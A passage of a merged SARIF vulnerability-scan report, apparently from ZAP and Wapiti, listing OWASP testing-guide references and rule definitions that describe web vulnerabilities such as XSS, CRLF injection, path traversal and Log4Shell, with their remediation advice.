              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.html",
              "id": "WSTG-CRYP-03"
            },
            {
              "guid": "93718af8-1306-4723-a431-5e795b654190",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.html",
              "id": "WSTG-ERRH-01"
            },
            {
              "guid": "ab39bea0-77ad-4667-82da-e02f3c51adf3",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html",
              "id": "WSTG-INFO-02"
            },
            {
              "guid": "86cf7a87-14c0-4df2-8c9d-70e42044130d",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.html",
              "id": "WSTG-INFO-03"
            },
            {
              "guid": "ab6d84cc-40ca-4031-b932-82fccac9dd22",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html",
              "id": "WSTG-INFO-08"
            },
            {
              "guid": "3699f90d-fb9d-44e6-8b8f-8eff326c1191",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html",
              "id": "WSTG-INPV-01"
            },
            {
              "guid": "142a0f53-213c-46bf-8c6d-c1c6fe19c7c6",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.html",
              "id": "WSTG-INPV-02"
            },
            {
              "guid": "a3466695-bf0f-4bbd-afe6-b0bcb55fc00a",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.html",
              "id": "WSTG-INPV-05"
            },
            {
              "guid": "48a7f7a2-cd6b-434f-bca7-93b704dbb4ae",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html",
              "id": "WSTG-INPV-06"
            },
            {
              "guid": "a54f56c9-1bdb-428f-84e9-3d1c671a269a",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.html",
              "id": "WSTG-INPV-11"
            },
            {
              "guid": "1c9fccb1-7061-4fd5-b62e-10e839c6e956",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html",
              "id": "WSTG-INPV-12"
            },
            {
              "guid": "52f62c50-3b42-42fe-bfc6-a1e8c179a651",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.html",
              "id": "WSTG-INPV-15"
            },
            {
              "guid": "882e418c-edd9-453c-8985-227e014daa58",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.html",
              "id": "WSTG-INPV-19"
            },
            {
              "guid": "f5b2588a-9b97-4593-a249-39931a9b491b",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html",
              "id": "WSTG-SESS-02"
            },
            {
              "guid": "72692c03-ba74-4d36-9886-45a01838ddf2",
              "helpUri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.html",
              "id": "WSTG-SESS-05"
            }
          ]
        }
      ],
      "tool": {
        "driver": {
          "name": "Merged Report Driver",
          "rules": [
            {
              "id": "40012",
              "defaultConfiguration": {
                "level": "error"
              },
              "fullDescription": {
                "text": "Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code."
              },
              "name": "Cross Site Scripting (Reflected)",
              "properties": {
                "references": [
                  "https://owasp.org/www-community/attacks/xss/",
                  "https://cwe.mitre.org/data/definitions/79.html"
                ],
                "solution": {
                  "text": "Phase: Architecture and Design\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\nExamples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.\n\nPhases: Implementation; Architecture and Design\nUnderstand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.\nFor any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.\nConsult the XSS Prevention Cheat Sheet for more details on the types of encoding and escaping that are needed.\n\nPhase: Architecture and Design\nFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.\n\nIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.\n\nPhase: Implementation\nFor every web page that is generated, use and specify a character encoding such as ISO-8859-1 or UTF-8. When an encoding is not specified, the web browser may choose a different encoding by guessing which encoding is actually being used by the web page. This can cause the web browser to treat certain sequences as special, opening up the client to subtle XSS attacks. See CWE-116 for more mitigations related to encoding/escaping.\n\nTo help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as \"red\" or \"blue.\"\n\nEnsure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.\n\t"
                },
                "confidence": "medium"
              },
              "relationships": [
                {
                  "kinds": [
                    "superset"
                  ],
                  "target": {
                    "guid": "5dd429c8-e5e3-37a8-bf40-f7b2d72a9085",
                    "id": "79",
                    "toolComponent": {
                      "guid": "b000a760-3e52-3565-a35c-f61369da53b7",
                      "name": "CWE"
                    }
                  }
                }
              ],
              "shortDescription": {
                "text": "Cross Site Scripting (Reflected)"
              }
            },
            {
              "id": "wapiti-backup-file",
              "name": "Backup file",
              "fullDescription": {
                "text": "It may be possible to find backup files of scripts on the webserver that the web-admin put here to save a previous version or backup files that are automatically generated by the software editor used (like for example Emacs). These copies may reveal interesting information like source code or credentials."
              },
              "properties": {
                "solution": "The webadmin must manually delete the backup files or remove it from the web root. He should also reconfigure its editor to deactivate automatic backups.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.html",
                    "text": "OWASP: Review Old Backup and Unreferenced Files for Sensitive Information"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/530.html",
                    "text": "CWE-530: Exposure of Backup File to an Unauthorized Control Sphere"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "530"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-04"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-weak-credentials",
              "name": "Weak credentials",
              "fullDescription": {
                "text": "The web application is using either default credentials or weak passwords that can be found in well-known passwords lists."
              },
              "properties": {
                "solution": "Do not ship or deploy with any default credentials, particularly for admin users. Implement weak-password checks, such as testing new or changed passwords against a list of the top 10000 worst passwords.",
                "references": [
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/798.html",
                    "text": "CWE-798: Use of Hard-coded Credentials"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/521.html",
                    "text": "CWE-521: Weak Password Requirements"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy",
                    "text": "OWASP: Testing for Weak Password Policy"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "798"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "521"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-ATHN-07"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-crlf-injection",
              "name": "CRLF Injection",
              "fullDescription": {
                "text": "The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL."
              },
              "properties": {
                "solution": "Check the submitted parameters and do not allow CRLF to be injected when it is not expected.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
                    "text": "OWASP: CRLF Injection"
                  },
                  {
                    "uri": "https://www.acunetix.com/websitesecurity/crlf-injection/",
                    "text": "Acunetix: What Are CRLF Injection Attacks"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/93.html",
                    "text": "CWE-93: Improper Neutralization of CRLF Sequences ('CRLF Injection')"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling",
                    "text": "OWASP: Testing for HTTP Splitting Smuggling"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "93"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-15"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-content-security-policy-configuration",
              "name": "Content Security Policy Configuration",
              "fullDescription": {
                "text": "Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks."
              },
              "properties": {
                "solution": "Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.",
                "references": [
                  {
                    "uri": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
                    "text": "Mozilla: Content Security Policy (CSP)"
                  },
                  {
                    "uri": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
                    "text": "OWASP: Content Security Policy Cheat Sheet"
                  },
                  {
                    "uri": "https://owasp.org/www-pdf-archive/2019-02-22_-_How_do_I_Content_Security_Policy_-_Print.pdf",
                    "text": "OWASP: How to do Content Security Policy (PDF)"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy",
                    "text": "OWASP: Content Security Policy"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-12"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "OSHP-Content-Security-Policy"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-cross-site-request-forgery",
              "name": "Cross Site Request Forgery",
              "fullDescription": {
                "text": "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated."
              },
              "properties": {
                "solution": "Check if your framework has built-in CSRF protection and use it. If framework does not have built-in CSRF protection add CSRF tokens to all state changing requests (requests that cause actions on the site) and validate them on backend.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.html",
                    "text": "OWASP: Testing for Cross Site Request Forgery"
                  },
                  {
                    "uri": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
                    "text": "OWASP: Cross-Site Request Forgery Prevention Cheat Sheet"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/352.html",
                    "text": "CWE-352: Cross-Site Request Forgery (CSRF)"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "352"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-SESS-05"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-potentially-dangerous-file",
              "name": "Potentially dangerous file",
              "fullDescription": {
                "text": "A file with potential vulnerabilities has been found on the website."
              },
              "properties": {
                "solution": "Make sure the script is up-to-date and restrict access to it if possible.",
                "references": [
                  {
                    "uri": "https://cve.mitre.org/cve/search_cve_list.html",
                    "text": "Mitre: Search details of a CVE"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration",
                    "text": "OWASP: Test Network Infrastructure Configuration"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-04"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-command-execution",
              "name": "Command execution",
              "fullDescription": {
                "text": "This attack consists in executing system commands on the server. The attacker tries to inject this commands in the request parameters."
              },
              "properties": {
                "solution": "Prefer working without user input when using file system calls.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection",
                    "text": "OWASP: Command Injection"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/78.html",
                    "text": "CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "78"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-12"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-path-traversal",
              "name": "Path Traversal",
              "fullDescription": {
                "text": "This attack is known as Path or Directory Traversal. Its aim is the access to files and directories that are stored outside the web root folder. The attacker tries to explore the directories stored in the web server. The attacker uses some techniques, for instance, the manipulation of variables that reference files with 'dot-dot-slash (../)' sequences and its variations to move up to root directory to navigate through the file system."
              },
              "properties": {
                "solution": "Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return 'Czechoslovakian'). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user's input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include",
                    "text": "OWASP: Path Traversal"
                  },
                  {
                    "uri": "https://www.acunetix.com/websitesecurity/directory-traversal/",
                    "text": "Acunetix: What is a Directory Traversal attack?"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/22.html",
                    "text": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "22"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-ATHZ-01"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-fingerprint-web-application-framework",
              "name": "Fingerprint web application framework",
              "fullDescription": {
                "text": "The version of a web application framework can be identified due to the presence of its specific fingerprints."
              },
              "properties": {
                "solution": "This is only for informational purposes.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html",
                    "text": "OWASP: Fingerprint Web Application Framework"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INFO-08"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-fingerprint-web-server",
              "name": "Fingerprint web server",
              "fullDescription": {
                "text": "The version of a web server can be identified due to the presence of its specific fingerprints."
              },
              "properties": {
                "solution": "This is only for informational purposes.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.html",
                    "text": "OWASP: Fingerprint Web Server"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INFO-02"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-htaccess-bypass",
              "name": "Htaccess Bypass",
              "fullDescription": {
                "text": "Htaccess files are used to restrict access to some files or HTTP method. In some case it may be possible to bypass this restriction and access the files."
              },
              "properties": {
                "solution": "Make sure every HTTP method is forbidden if the credentials are bad.",
                "references": [
                  {
                    "uri": "http://blog.teusink.net/2009/07/common-apache-htaccess-misconfiguration.html",
                    "text": "A common Apache .htaccess misconfiguration"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/538.html",
                    "text": "CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
                    "text": "OWASP: HTTP Methods"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "538"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-06"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-html-injection",
              "name": "HTML Injection",
              "fullDescription": {
                "text": "HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can allow the attacker to modify the page content seen by the victims."
              },
              "properties": {
                "solution": "Avoid Raw HTML Rendering: Whenever possible, avoid directly rendering user-generated content as raw HTML. Instead, use built-in templating systems or libraries that automatically escape user input by default, such as Django's template engine or AngularJS's ng-bind directive. With PHP you can use the htmlspecialchars() function to convert special characters to their corresponding HTML entities.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/03-Testing_for_HTML_Injection",
                    "text": "OWASP: Testing for HTML Injection"
                  },
                  {
                    "uri": "https://www.imperva.com/learn/application-security/html-injection/",
                    "text": "IMPERVA: HTML Injection"
                  },
                  {
                    "uri": "https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection",
                    "text": "HackTricks: Dangling Markup - HTML scriptless injection"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CLNT-03"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-clickjacking-protection",
              "name": "Clickjacking Protection",
              "fullDescription": {
                "text": "Clickjacking is a technique that tricks a user into clicking something different from what the user perceives, potentially revealing confidential information or taking control of their computer."
              },
              "properties": {
                "solution": "Implement X-Frame-Options or Content Security Policy (CSP) frame-ancestors directive.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking",
                    "text": "OWASP: Clickjacking"
                  },
                  {
                    "uri": "https://www.keycdn.com/support/prevent-clickjacking",
                    "text": "KeyCDN: Preventing Clickjacking"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "OSHP-X-Frame-Options"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-http-strict-transport-security-(hsts)",
              "name": "HTTP Strict Transport Security (HSTS)",
              "fullDescription": {
                "text": "HSTS is a web security policy mechanism that helps to protect websites against man-in-the-middle attacks such as protocol downgrade attacks and cookie hijacking."
              },
              "properties": {
                "solution": "Implement the HTTP Strict Transport Security header to enforce secure connections to the server.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security",
                    "text": "OWASP: HTTP Strict Transport Security"
                  },
                  {
                    "uri": "https://www.keycdn.com/support/hsts",
                    "text": "KeyCDN: Enabling HSTS"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CONF-07"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "OSHP-HTTP-Strict-Transport-Security"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-mime-type-confusion",
              "name": "MIME Type Confusion",
              "fullDescription": {
                "text": "MIME type confusion can occur when a browser interprets files as a different type than intended, which could lead to security vulnerabilities like cross-site scripting (XSS)."
              },
              "properties": {
                "solution": "Implement X-Content-Type-Options to prevent MIME type sniffing.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/MIME_sniffing",
                    "text": "OWASP: MIME Sniffing"
                  },
                  {
                    "uri": "https://www.keycdn.com/support/preventing-mime-type-sniffing",
                    "text": "KeyCDN: Preventing MIME Type Sniffing"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "OSHP-X-Content-Type-Options"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-httponly-flag-cookie",
              "name": "HttpOnly Flag cookie",
              "fullDescription": {
                "text": "HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it)."
              },
              "properties": {
                "solution": "While creation of the cookie, make sure to set the HttpOnly Flag to True.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.html",
                    "text": "OWASP: Testing for Cookies Attributes"
                  },
                  {
                    "uri": "https://owasp.org/www-community/HttpOnly",
                    "text": "OWASP: HttpOnly"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-SESS-02"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-unencrypted-channels",
              "name": "Unencrypted Channels",
              "fullDescription": {
                "text": "Sensitive data must be protected when it is transmitted through the network."
              },
              "properties": {
                "solution": "Use HTTPS for the whole web site and redirect any HTTP requests to HTTPS.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels",
                    "text": "Testing for Sensitive Information Sent via Unencrypted Channels"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security",
                    "text": "Testing for Weak Transport Layer Security"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-CRYP-03"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-ldap-injection",
              "name": "LDAP Injection",
              "fullDescription": {
                "text": "LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries."
              },
              "properties": {
                "solution": "To protect against XPATH injection, Escape all variables using the right LDAP encoding function. Use Frameworks that Automatically Protect from LDAP Injection.",
                "references": [
                  {
                    "uri": "https://owasp.org/www-community/attacks/LDAP_Injection",
                    "text": "LDAP Injection"
                  },
                  {
                    "uri": "https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html",
                    "text": "LDAP Injection Prevention Cheat Sheet"
                  },
                  {
                    "uri": "https://cwe.mitre.org/data/definitions/90.html",
                    "text": "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
                  }
                ]
              },
              "relationships": [
                {
                  "target": {
                    "toolComponent": {
                      "name": "CWE"
                    },
                    "id": "90"
                  },
                  "kind": "relevant"
                },
                {
                  "target": {
                    "toolComponent": {
                      "name": "OWASP WSTG"
                    },
                    "id": "WSTG-INPV-06"
                  },
                  "kind": "relevant"
                }
              ]
            },
            {
              "id": "wapiti-log4shell",
              "name": "Log4Shell",
              "fullDescription": {
                "text": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled."
              },
              "properties": {
                "solution": "From log4j 2.15.0, this behavior has been disabled by default. In previous releases (>2.10) this behavior can be mitigated by setting system property \"log4j2.formatMsgNoLookups\" to \"true\" or it can be mitigated in prior releases (<2.10) by removing the JndiLookup class from the classpath (example: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class).",
                "references": [
                  {
                    "uri": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                    "text": "NVD: CVE-2021-44228 Detail"
                  },
                  {
                    "uri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
                    "text": "NITRE: CVE-2021-44228"
                  },
                  {
                    "uri": "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection",
